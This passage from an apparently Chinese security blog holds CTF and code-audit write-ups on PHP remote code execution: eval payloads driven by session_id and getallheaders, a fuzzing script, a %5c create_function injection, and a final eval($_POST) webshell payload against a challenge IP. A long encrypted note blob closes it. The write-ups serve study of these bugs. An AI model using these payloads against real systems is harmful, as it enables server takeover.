http://127.0.0.1/demo5.php?code=eval(hex2bin(session_id())); 抓包修改cookie为phpinfo()的16进制 发现并没有执行phpinfo() 仔细分析我们的利用方式，通过对session机制的深入了解，在w3school发现了这个 此时更改我们请求的URL为 http://127.0.0.1/demo5.php?code=eval(hex2bin(session_id(session_start()))); 再次进行上述操作，成功实现RCE apache下的利用当web服务器为apache时，nginx下的函数虽不能用，但是我们可以使用同样的思路，通过控制head头参数来实现RCE 我们可以使用getallheaders函数，来看一下官方文档 实际测试一下 http://127.0.0.1/demo5.php?code=var_dump(getallheaders()); 返回信息 array(8) { [&quot;Host&quot;]=&gt; string(9) &quot;127.0.0.1&quot; [&quot;User-Agent&quot;]=&gt; string(73) &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&quot; [&quot;Accept&quot;]=&gt; string(63) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot; [&quot;Accept-Language&quot;]=&gt; string(35) &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot; [&quot;Accept-Encoding&quot;]=&gt; string(13) &quot;gzip, deflate&quot; [&quot;DNT&quot;]=&gt; string(1) &quot;1&quot; [&quot;X-Forwarded-For&quot;]=&gt; string(9) &quot;127.0.0.1&quot; [&quot;Connection&quot;]=&gt; string(10) &quot;keep-alive&quot; } 这样我们可以尝试控制host的值来传入我们的命令，如phpinfo(); 为了将phpinfo();取出来，我们可以使用current函数 http://127.0.0.1/demo5.php?code=var_dump(current(getallheaders())); 将var_dump()改为eval()即实现RCE http://127.0.0.1/demo5.php?code=eval(current(getallheaders())); 总结虽然刚入手这一部分的知识感觉理解上很吃力，但是经过自己反复实际操作后，也弄清楚了很多细节，理清背景思路后回头思考会发现并没有那么困难，这也引发了我的一些思考，我们在平时学习某一块的知识时，不应该光看不做，只有实际操作后才会弄清很多细节，深刻理解这些技巧的精髓。]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[code-breaking-function]]></title>
    <url>%2F2019%2F05%2F14%2Fcode-breaking-function%2F</url>
    <content type="text"><![CDATA[本篇属于我的代码审计学习系列 function题目代码： 123456789&lt;?php$action = $_GET['action'] ?? '';$arg = $_GET['arg'] ?? '';if(preg_match('/^[a-z0-9_]*$/isD', $action)) &#123; show_source(__FILE__);&#125; else &#123; $action('', $arg);&#125; bypass正则题目中提供了两个可控的参数，但是我们需要绕过正则的限制，如何bypass正则我们可以进行字符fuzz测试 123456789import requestsfor i in range(0,256): j = hex(i)[2:] payload = "%"+j #print(payload) url = "http://127.0.0.1/demo8.php?action="+payload+"var_dump&amp;arg=yml" html = requests.get(url) if "yml" in html.text: print(payload) 可以看到%5c可以bypass正则 关于为何%5c可以bypass掉正则，出题人有如下解释: php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 getshell绕过正则后，我们重点来看利用点的函数类型 函数需要两个参数，我们可以控制其中第二个参数进行getshell 这样通过寻找，最终确定了create_function()函数，我们看一下官方文档 简单解释就是参数$args控制匿名函数的参数，$code控制匿名函数的代码 我们可以抽象出如下代码模式 1234fuction a($args)&#123; $code&#125; 不难联想到这样的模式可以通过代码注入的方式来getshell 然后回归题目，我们看到可控参数在第二个，也就是$code部分，抽象出来的模型是这样的 1234fuction a()&#123; $code&#125; 然后进行构造，我们可以尝试如下的方式来执行phpinfo() 12345&lt;?phpfunction a()&#123;return '121';&#125;phpinfo();/*)&#123;&#125;?&gt; 本地看一下测试结果 至此我们可以构造如下payload 1action=%5ccreate_function&amp;arg=return '121';&#125;phpinfo();/*)&#123; 结果 思考题目中的的可控参数为第二个，那么当可控参数为第一个的时候我们如何getshell呢？ 题目代码改成这样 构建利用原型 1234fuction a($arg)&#123; &#125; 在这个时候，我们依然可以参考上面的利用方式，构造如下 1234&lt;?phpfunction a()&#123;return 'yml';&#125;phpinfo();/*)&#123;&#125;?&gt; 这个时候可构造如下payload 1action=%5ccreate_function&amp;arg=)&#123;return 'yml';&#125;phpinfo();/* 成功实现代码执行 getflag可以代码执行后我们就可以使用eval函数来利用了 http://119.3.232.233:8087/?action=%5ccreate_function&amp;arg=return &apos;121&apos;;}eval($_POST[&apos;a&apos;]);/*){ 工具连接]]></content>
  </entry>
  <entry>
    <title><![CDATA[置顶-个人备忘笔记]]></title>
    <url>%2F2019%2F05%2F06%2F%E7%BD%AE%E9%A1%B6-%E4%B8%AA%E4%BA%BA%E5%A4%87%E5%BF%98%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[输入密码，查看文章 Incorrect Password! No content to display! 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